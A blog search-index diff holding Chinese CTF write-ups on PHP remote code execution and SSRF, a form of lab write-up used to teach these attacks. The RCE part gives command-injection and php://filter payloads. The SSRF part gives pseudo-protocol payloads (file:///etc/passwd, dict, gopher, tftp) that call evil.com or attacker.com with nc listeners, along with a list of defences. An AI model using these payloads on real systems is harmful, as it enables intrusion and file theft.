-    <content><![CDATA[<h2 id="BASIC-RCE"><a href="#BASIC-RCE" class="headerlink" title="BASIC RCE"></a>BASIC RCE</h2><p>RCE英文全称：remote command/code execute（远程命令/代码执行漏洞）<br>分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：没有在输入口做输入处理。<br>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p>
-<p>参考：<a href="https://blog.csdn.net/weixin_43486981/article/details/107997468">https://blog.csdn.net/weixin_43486981/article/details/107997468</a><br><a href="https://www.cnblogs.com/NPFS/p/13797436.html">https://www.cnblogs.com/NPFS/p/13797436.html</a></p>
-<h2 id="basic-rce"><a href="#basic-rce" class="headerlink" title="basic rce"></a>basic rce</h2><p><img src="https://img-blog.csdnimg.cn/20201128030212911.png" alt="在这里插入图片描述"><br>PHP代码显示，要求将命令赋值给a然后执行,<br>先查看一下根目录文件 /?a=system(“ls”);<br>！<strong>切记最后的分号不可省略！</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/20201128030344343.png" alt="在这里插入图片描述"><br>发现f111a9.php，试着打开php文件, /?a=system(“cat f111a9.php”); 发现打不开。</p>
-<p>应该是文件中包含特殊字符，使用管道运行base64加密内容</p>
-<p>/?a=system(“cat f111a9.php|base64”);</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128030707901.png" alt="在这里插入图片描述">进行解码,得到flag：flag{Web_xiao_fen_dui}<br><img src="https://img-blog.csdnimg.cn/20201128030752296.png" alt="在这里插入图片描述"></p>
-<h2 id="basic-rce2"><a href="#basic-rce2" class="headerlink" title="basic rce2"></a>basic rce2</h2><p><img src="https://img-blog.csdnimg.cn/20201128031321970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先查看一下根目录文件/?Rem=system(“ls”); 发现<br><img src="https://img-blog.csdnimg.cn/20201128031500371.png" alt="在这里插入图片描述"><br>但题目中</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128032721390.png" alt="在这里插入图片描述"></p>
-<p>过滤了more、less等，直接用include进行包含</p>
-<p>?Rem=include $_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20201128032731840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进行解码,得到flag</p>
-<p>flag{oh_Rem_is_so_cute~}</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>rce</tag>
-        <tag>rce相关知识</tag>
       </tags>
   </entry>
   <entry>
@@ -687,61 +661,6 @@
       <tags>
         <tag>SQL</tag>
         <tag>replace()函数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSRF</title>
-    <url>/2020/12/07/SSRF(CTFHub)(1)/</url>
-    <content><![CDATA[<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
-<p>SSRF 形成的原因：大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</p>
-<p>也就是说，对于为服务器提供服务的其他应用没有对访问进行限制，如果我构造好我的访问包，那我就有可能利用目标服务对他的其他服务器应用进行调用。</p>
-<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p>
-<h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><p><img src="https://img-blog.csdnimg.cn/20201129141702905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现</p>
-<p><img src="https://img-blog.csdnimg.cn/20201129141803589.png" alt="在这里插入图片描述"><br>根据题目意思，让我们如访问内网的flag.php<br>输入127.0.0.1/flag.php ，得到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20201129141922387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">也可抓包进行访问，即可得到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20201129142007545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p>根据题目的意思我们需要使用URL的伪协议去读取文件，那么我们首先要了解URL的伪协议。</p>
-<p>URL伪协议有如下这些：<br><img src="https://img-blog.csdnimg.cn/20201129142344286.png" alt="在这里插入图片描述"><br><code>file://</code>这种URL Schema可以尝试从文件系统中获取文件：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwdhttp:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini</span><br></pre></td></tr></table></figure>
-<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
-<p><code>dict://</code>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?dict:&#x2F;&#x2F;evil.com:1337&#x2F; </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp&#x2F;*] </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>
-<p><code>sftp://</code>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;sftp:&#x2F;&#x2F;evil.com:1337&#x2F; </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp&#x2F;*] </span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure>
-<p><code>ldap://</code>或<code>ldaps://</code> 或<code>ldapi://</code>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aquithttp:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;ldaps:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aquithttp:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;ldapi:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aquit</span><br></pre></td></tr></table></figure>
-
-<p><code> tftp://</code>  TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;tftp:&#x2F;&#x2F;evil.com:1337&#x2F;TESTUDPPACKET </span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure>
-<p><code>gopher://</code> Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;attacker.com&#x2F;gopher.php</span><br><span class="line"></span><br><span class="line">&lt;?php  header(&#39;Location: gopher:&#x2F;&#x2F;evil.com:1337&#x2F;_Hi%0Assrf%0Atest&#39;);?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp&#x2F;*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure>
-<p>防御</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.禁止跳转</span><br><span class="line">2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</span><br><span class="line">3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题</span><br><span class="line">4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</span><br><span class="line">5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</span><br><span class="line">6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20201130130635337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201130130658887.png" alt="在这里插入图片描述">使用file伪协议从文件系统中读取文件，抓包读取:</p>
-<p>**网站的目录一般都在<code>/var/www/html/</code>**，因此我们直接使用file伪协议访问flag.php就可以了。<br><img src="https://img-blog.csdnimg.cn/2020113013101163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="![在这里插入图片描述](https://img-blog.csdnimg.cn/2020113013095957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70"></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://img-blog.csdnimg.cn/20201130131217658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201130131237347.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201130131309795.png" alt="在这里插入图片描述">题目提示端口在8000-9000，因此直接扫就可以了。这里我们需要使用dict伪协议来扫描，因为dict协议可以用来探测开放的端口。</p>
-<p><code>dict://</code>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?dict:&#x2F;&#x2F;evil.com:1337&#x2F; </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp&#x2F;*] </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20201130140408511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201130134217486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>?url=dict://127.0.0.1:§§</code>开始扫描<br>发现端口是8056.直接进行访问，就可以得到flag了。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201206135512184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p><img src="https://img-blog.csdnimg.cn/20201130135110568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201130135125582.png" alt="在这里插入图片描述"><code>?url=127.0.0.1/flag.php</code>尝试直接访问<br><img src="https://img-blog.csdnimg.cn/20201130135330773.png" alt="在这里插入图片描述">出现输入框<br><img src="https://img-blog.csdnimg.cn/20201130135426903.png" alt="在这里插入图片描述"><br>使用Burpsuite抓包，得到<br><img src="https://img-blog.csdnimg.cn/20201130135734268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- Debug: key&#x3D;6b82739ec82821b2d6bbc34b0af30d76--&gt;</span><br></pre></td></tr></table></figure>
-<p>且flag.php存在，将其输入输入框内</p>
-<p><img src="https://img-blog.csdnimg.cn/20201130135651735.png" alt="在这里插入图片描述"><br>得到提示从127.0.0.1查看，且题目提示POST方式</p>
-<p>使用POST方式通过127.0.0.1:80访问flag.php，且在底部输入所得到的<code>key=6b82739ec82821b2d6bbc34b0af30d76</code>即得到flag<br><img src="https://img-blog.csdnimg.cn/20201130140909273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><p><img src="https://img-blog.csdnimg.cn/20201206135056426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>http://www.baidu.com@192.168.0.1/</code>与<code>http://192.168.0.1</code>请求的都是<code>192.168.0.1</code>的内容。</p>
-<p>即构造<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20201206135317719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>SSRF</tag>
-        <tag>SSRF相关知识</tag>
       </tags>
   </entry>
   <entry>
@@ -812,6 +731,87 @@
       </tags>
   </entry>
   <entry>
+    <title>BASIC RCE</title>
+    <url>/2020/11/28/BASIC%20RCE/</url>
+    <content><![CDATA[<h2 id="BASIC-RCE"><a href="#BASIC-RCE" class="headerlink" title="BASIC RCE"></a>BASIC RCE</h2><p>RCE英文全称：remote command/code execute（远程命令/代码执行漏洞）<br>分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：没有在输入口做输入处理。<br>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p>
+<p>参考：<a href="https://blog.csdn.net/weixin_43486981/article/details/107997468">https://blog.csdn.net/weixin_43486981/article/details/107997468</a><br><a href="https://www.cnblogs.com/NPFS/p/13797436.html">https://www.cnblogs.com/NPFS/p/13797436.html</a></p>
+<h2 id="basic-rce"><a href="#basic-rce" class="headerlink" title="basic rce"></a>basic rce</h2><p><img src="https://img-blog.csdnimg.cn/20201128030212911.png" alt="在这里插入图片描述"><br>PHP代码显示，要求将命令赋值给a然后执行,<br>先查看一下根目录文件 /?a=system(“ls”);<br>！<strong>切记最后的分号不可省略！</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20201128030344343.png" alt="在这里插入图片描述"><br>发现f111a9.php，试着打开php文件, /?a=system(“cat f111a9.php”); 发现打不开。</p>
+<p>应该是文件中包含特殊字符，使用管道运行base64加密内容</p>
+<p>/?a=system(“cat f111a9.php|base64”);</p>
+<p><img src="https://img-blog.csdnimg.cn/20201128030707901.png" alt="在这里插入图片描述">进行解码,得到flag：flag{Web_xiao_fen_dui}<br><img src="https://img-blog.csdnimg.cn/20201128030752296.png" alt="在这里插入图片描述"></p>
+<h2 id="basic-rce2"><a href="#basic-rce2" class="headerlink" title="basic rce2"></a>basic rce2</h2><p><img src="https://img-blog.csdnimg.cn/20201128031321970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先查看一下根目录文件/?Rem=system(“ls”); 发现<br><img src="https://img-blog.csdnimg.cn/20201128031500371.png" alt="在这里插入图片描述"><br>但题目中</p>
+<p><img src="https://img-blog.csdnimg.cn/20201128032721390.png" alt="在这里插入图片描述"></p>
+<p>过滤了more、less等，直接用include进行包含</p>
+<p>?Rem=include $_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20201128032731840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进行解码,得到flag</p>
+<p>flag{oh_Rem_is_so_cute~}</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>rce</tag>
+        <tag>rce相关知识</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSRF</title>
+    <url>/2020/12/07/SSRF(CTFHub)(1)/</url>
+    <content><![CDATA[<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+<p>SSRF 形成的原因：大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</p>
+<p>也就是说，对于为服务器提供服务的其他应用没有对访问进行限制，如果我构造好我的访问包，那我就有可能利用目标服务对他的其他服务器应用进行调用。</p>
+<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p>
+<h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><p><img src="https://img-blog.csdnimg.cn/20201129141702905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现</p>
+<p><img src="https://img-blog.csdnimg.cn/20201129141803589.png" alt="在这里插入图片描述"><br>根据题目意思，让我们如访问内网的flag.php<br>输入127.0.0.1/flag.php ，得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20201129141922387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">也可抓包进行访问，即可得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20201129142007545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p>根据题目的意思我们需要使用URL的伪协议去读取文件，那么我们首先要了解URL的伪协议。</p>
+<p>URL伪协议有如下这些：<br><img src="https://img-blog.csdnimg.cn/20201129142344286.png" alt="在这里插入图片描述"><br><code>file://</code>这种URL Schema可以尝试从文件系统中获取文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwdhttp:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini</span><br></pre></td></tr></table></figure>
+<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
+<p><code>dict://</code>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?dict:&#x2F;&#x2F;evil.com:1337&#x2F; </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp&#x2F;*] </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>
+<p><code>sftp://</code>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;sftp:&#x2F;&#x2F;evil.com:1337&#x2F; </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp&#x2F;*] </span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure>
+<p><code>ldap://</code>或<code>ldaps://</code> 或<code>ldapi://</code>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aquithttp:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;ldaps:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aquithttp:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;ldapi:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aquit</span><br></pre></td></tr></table></figure>
+
+<p><code> tftp://</code>  TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;tftp:&#x2F;&#x2F;evil.com:1337&#x2F;TESTUDPPACKET </span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure>
+<p><code>gopher://</code> Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;attacker.com&#x2F;gopher.php</span><br><span class="line"></span><br><span class="line">&lt;?php  header(&#39;Location: gopher:&#x2F;&#x2F;evil.com:1337&#x2F;_Hi%0Assrf%0Atest&#39;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp&#x2F;*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure>
+<p>防御</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.禁止跳转</span><br><span class="line">2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</span><br><span class="line">3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题</span><br><span class="line">4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</span><br><span class="line">5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</span><br><span class="line">6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201130130635337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201130130658887.png" alt="在这里插入图片描述">使用file伪协议从文件系统中读取文件，抓包读取:</p>
+<p>**网站的目录一般都在<code>/var/www/html/</code>**，因此我们直接使用file伪协议访问flag.php就可以了。<br><img src="https://img-blog.csdnimg.cn/2020113013101163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="![在这里插入图片描述](https://img-blog.csdnimg.cn/2020113013095957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://img-blog.csdnimg.cn/20201130131217658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201130131237347.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201130131309795.png" alt="在这里插入图片描述">题目提示端口在8000-9000，因此直接扫就可以了。这里我们需要使用dict伪协议来扫描，因为dict协议可以用来探测开放的端口。</p>
+<p><code>dict://</code>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
